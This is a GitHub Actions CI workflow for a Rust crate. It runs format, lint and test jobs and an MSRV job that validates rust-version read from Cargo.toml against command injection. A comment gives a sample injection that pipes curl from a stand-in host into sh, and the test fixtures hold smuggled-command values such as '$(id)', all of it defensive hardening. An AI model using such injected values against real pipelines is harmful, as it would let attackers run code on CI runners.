name: CI

on:
  push:
    branches: [main]
  pull_request:

# A superseded run answers a question nobody is asking any more.
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

env:
  CARGO_TERM_COLOR: always

jobs:
  check:
    name: fmt, clippy, test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install stable toolchain
        run: |
          rustup toolchain install stable --profile minimal \
            --component rustfmt --component clippy
          rustup default stable

      # No dependency cache here on purpose: celastro has no dependencies
      # outside std, so there is nothing to restore and the cache round trip
      # would cost more than the compile it saves.

      - name: Format
        run: cargo fmt --all -- --check

      - name: Clippy
        run: cargo clippy --all-targets -- -D warnings

      - name: Test
        run: cargo test

  msrv:
    name: MSRV
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # Read the floor from the manifest rather than repeating it here, so the
      # two cannot drift apart. The extractor is a file rather than an inline
      # snippet so that the step below can exercise it against crafted
      # manifests; on a pull_request from a fork the manifest is written by the
      # person opening the pull request, and its value reaches both a shell
      # command line and GITHUB_OUTPUT's key=value format.
      - name: Write the rust-version extractor
        run: |
          cat > "$RUNNER_TEMP/read-msrv.sh" <<'SCRIPT'
          #!/bin/sh
          # Prints the first rust-version declared in the manifest named by $1.
          set -eu
          # [^"]* rather than .*, so a trailing comment containing a quote
          # cannot be swallowed into the value; head -n 1 keeps a second
          # rust-version line from turning the result into two lines, which
          # would corrupt the key=value line the caller appends to
          # GITHUB_OUTPUT.
          version=$(sed -n 's/^rust-version *= *"\([^"]*\)".*/\1/p' "$1" | head -n 1)
          if [ -z "$version" ]; then
            echo "no rust-version in $1" >&2
            exit 1
          fi
          # The value ends up in a shell command line, so refuse anything that
          # is not a bare version number: without this an entry such as
          # rust-version = "1.75; curl evil.example | sh" runs on the runner.
          if ! printf '%s' "$version" | grep -Eq '^[0-9]+(\.[0-9]+){0,2}$'; then
            echo "rust-version '$version' is not a plain version number" >&2
            exit 1
          fi
          printf '%s\n' "$version"
          SCRIPT
          chmod +x "$RUNNER_TEMP/read-msrv.sh"

      # Each fixture below is a manifest that the previous greedy, unvalidated
      # extraction mishandled. They run against the same script the real read
      # uses, so deleting the guards fails here rather than silently at the
      # next crafted pull request.
      - name: A crafted rust-version cannot escape the extractor
        run: |
          fixture="$RUNNER_TEMP/fixture-Cargo.toml"

          # usage: expect <expected version, or FAIL> <manifest line>...
          expect() {
            want=$1
            shift
            printf '%s\n' "$@" > "$fixture"
            if got=$("$RUNNER_TEMP/read-msrv.sh" "$fixture" 2>&1); then
              status=accepted
            else
              status=rejected
            fi
            if [ "$want" = FAIL ]; then
              if [ "$status" != rejected ]; then
                echo "expected rejection of: $*"
                echo "but it yielded: $got"
                exit 1
              fi
            elif [ "$status" != accepted ] || [ "$got" != "$want" ]; then
              echo "expected '$want' from: $*"
              echo "but got ($status): $got"
              exit 1
            fi
          }

          expect 1.75 '[package]' 'rust-version = "1.75"'
          expect 1.75 'rust-version = "1.75" # do not raise past "1.80"'
          expect 1.75 'rust-version = "1.75"' 'rust-version = "1.60"'
          expect FAIL 'rust-version = "1.75; touch $RUNNER_TEMP/pwned"'
          expect FAIL 'rust-version = "$(id)"'
          expect FAIL '[package]' 'name = "celastro"'

      - name: Read rust-version from Cargo.toml
        id: msrv
        run: |
          version=$("$RUNNER_TEMP/read-msrv.sh" Cargo.toml)
          echo "version=$version" >> "$GITHUB_OUTPUT"

      # The version crosses into these scripts as an environment variable, not
      # as ${{ }} text pasted into the command, so even a value that slipped
      # past validation would be an argument rather than shell syntax.
      - name: Install ${{ steps.msrv.outputs.version }}
        env:
          MSRV: ${{ steps.msrv.outputs.version }}
        run: rustup toolchain install "$MSRV" --profile minimal

      # Catches the failure that prompted this job: a Cargo.lock written in a
      # newer lockfile format than the declared floor can parse. Building is
      # what proves the claim; reading the manifest does not.
      - name: Check
        env:
          MSRV: ${{ steps.msrv.outputs.version }}
        run: cargo "+$MSRV" check --all-targets

      - name: Cargo.lock is readable at the MSRV without being rewritten
        run: git diff --exit-code -- Cargo.lock
